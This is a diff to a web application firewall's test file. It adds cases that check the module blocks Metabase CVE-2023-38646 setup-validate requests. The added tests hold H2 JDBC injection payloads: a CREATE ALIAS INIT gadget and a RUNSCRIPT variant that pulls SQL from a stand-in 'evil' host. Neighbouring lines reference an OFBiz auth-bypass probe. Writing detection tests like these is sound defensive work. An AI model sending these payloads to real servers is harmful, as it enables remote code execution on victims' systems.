@@ -38,15 +38,32 @@ GET /t?p=/webtools/control/main&requirePasswordChange=Y
 --- error_code: 403
 
 === TEST 4: Metabase setup-validate carrying an H2 JDBC INIT gadget
+# CVE-2023-38646: the H2 connection string runs an INIT script at connect --
+# "INIT=CREATE ALIAS ... AS ..." defines a Java-backed function, the RCE
+# primitive. That INIT clause is the gadget no installer sends; a bare
+# "jdbc:h2:mem:test" DSN is benign (t/05 TEST 73). The rule requires the
+# endpoint, an H2 JDBC DSN, AND the INIT gadget.
 --- config
     location /t { shield block; shield_body on; empty_gif; }
 --- request eval
 "POST /t
-{\"token\":\"x\",\"details\":{\"details\":{\"db\":\"zip:/app/metabase.jar\"},\"engine\":\"h2\"},\"url\":\"/api/setup/validate\",\"conn\":\"jdbc:h2:mem:test\"}"
+{\"token\":\"x\",\"details\":{\"details\":{\"db\":\"zip:/app/metabase.jar\"},\"engine\":\"h2\"},\"url\":\"/api/setup/validate\",\"conn\":\"jdbc:h2:mem:test;INIT=CREATE ALIAS EXEC AS \$\$ void e(){} \$\$\"}"
 --- more_headers
 Content-Type: application/json
 --- error_log
 category=deserial
+--- error_code: 403
+
+=== TEST 4b: Metabase H2 INIT gadget via the RUNSCRIPT remote-fetch variant
+# The second INIT form: "INIT=RUNSCRIPT FROM '<url>'" pulls remote SQL at
+# connect. The "init=" term catches both CREATE ALIAS and RUNSCRIPT.
+--- config
+    location /t { shield block; shield_body on; empty_gif; }
+--- request eval
+"POST /t
+{\"url\":\"/api/setup/validate\",\"conn\":\"jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://evil/x.sql'\"}"
+--- more_headers
+Content-Type: application/json
 --- error_code: 403
 
 === TEST 5: time-based SQLi -- sleep( paired with a SELECT
